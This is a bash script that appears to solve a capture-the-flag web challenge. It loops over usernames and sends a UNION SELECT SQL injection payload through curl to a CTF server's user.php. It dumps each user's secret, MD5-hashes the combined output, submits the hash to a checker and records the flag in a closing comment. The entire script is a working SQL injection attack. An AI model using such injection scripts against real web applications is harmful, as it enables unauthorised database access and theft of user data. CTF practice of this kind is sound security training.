#!/bin/bash

url="http://web.camsctf.com/13/user.php"
hashes=""

while read user; do
    echo $user
    response=$(curl -s $url --data "input=' UNION SELECT s3crets from cr3wm3mberz WHERE us3rname = \"$user\" -- ")
    hashes=${hashes}$response
done < users.txt

hashes=$(echo $hashes | sed "s/<br>//g")

password=$(python -c "import hashlib; print hashlib.md5('$hashes').hexdigest()")

echo "The password is $password"

flag=$(curl http://web.camsctf.com/13/check.php --data "answer=$password")
echo "$flag"

# {i_hack_so_much_sqlz}
